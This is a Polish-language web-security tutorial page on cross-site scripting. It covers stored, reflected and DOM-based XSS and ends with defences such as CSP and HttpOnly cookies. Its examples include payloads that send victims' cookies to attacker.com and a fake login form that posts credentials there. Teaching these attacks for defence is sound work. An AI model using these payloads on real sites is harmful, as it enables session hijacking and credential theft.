---
id: "cross-site-scripting"
title: "🎯 Cross-Site Scripting (XSS)"
sidebar_position: 9
---

# 🎯 Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) to jeden z najczęściej wykorzystywanych wektorów ataku na aplikacje webowe. Polega na wstrzyknięciu złośliwego kodu JavaScript do aplikacji, co może prowadzić do przejęcia sesji użytkownika, wykradania danych lub wykonywania nieautoryzowanych operacji.

---

## 🔥 Rodzaje ataków XSS

### **1️⃣ Stored XSS (Trwały XSS)**
Atakujący zapisuje złośliwy skrypt w bazie danych lub na serwerze, a następnie jest on wykonywany w przeglądarce użytkownika podczas odwiedzenia strony.

#### **Przykład ataku Stored XSS**
Podatna aplikacja zapisuje komentarze bez filtrowania treści:
```html
<input type="text" name="comment" value="">
```
Atakujący wpisuje:
```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```
Każdy użytkownik, który odwiedzi stronę, wykona złośliwy kod JavaScript.

---

### **2️⃣ Reflected XSS (Odbity XSS)**
Złośliwy skrypt jest wstrzykiwany w parametrach URL i wykonywany przez przeglądarkę ofiary.

#### **Przykład ataku Reflected XSS**
Podatna aplikacja wyświetla dane z URL:
```php
<?php echo $_GET["query"]; ?>
```
Atakujący wysyła ofierze link:
```http
http://example.com/search?query=<script>alert('XSS')</script>
```
Jeśli użytkownik otworzy ten link, przeglądarka wykona złośliwy kod.

---

### **3️⃣ DOM-based XSS**
Występuje, gdy złośliwy skrypt jest wykonywany po stronie przeglądarki bez interakcji z serwerem.

#### **Przykład ataku DOM XSS**
Podatny kod JavaScript:
```javascript
document.write("Wyszukiwane: " + location.hash);
```
Atakujący wysyła:
```http
http://example.com/#<script>alert('XSS')</script>
```
Gdy użytkownik otworzy link, przeglądarka wykona kod JavaScript.

---

## 🛑 Wykorzystanie XSS do kradzieży sesji
XSS pozwala na przejęcie sesji użytkownika poprzez wykradanie cookies.

#### **1️⃣ Przechwytywanie sesji**
Atakujący wstrzykuje skrypt:
```javascript
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```
Ofiara odwiedza stronę → jej sesja jest wysyłana do serwera atakującego.

#### **2️⃣ Tworzenie fałszywych formularzy**
Można stworzyć formularz logowania, który kradnie dane użytkownika:
```html
<form action="http://attacker.com/steal" method="POST">
  <input type="text" name="username" placeholder="Login">
  <input type="password" name="password" placeholder="Hasło">
  <input type="submit" value="Zaloguj się">
</form>
```

---

## 🔐 Zabezpieczenia przed XSS
- **Filtrowanie wejścia** – użycie `htmlspecialchars()` w PHP lub `encodeURIComponent()` w JS.
- **CSP (Content Security Policy)** – blokowanie wykonywania inline JavaScript.
- **HttpOnly dla cookies** – zabezpiecza przed odczytem JavaScript.
- **Sanityzacja danych na wejściu i wyjściu** – usuwanie podejrzanych znaków.

Przykład ochrony CSP:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

---

Ataki XSS mogą prowadzić do przejęcia kont i eskalacji uprawnień. Kolejnym krokiem będzie analiza podatności **Insecure Direct Object References (IDOR) & Broken Access Control**! 🚀
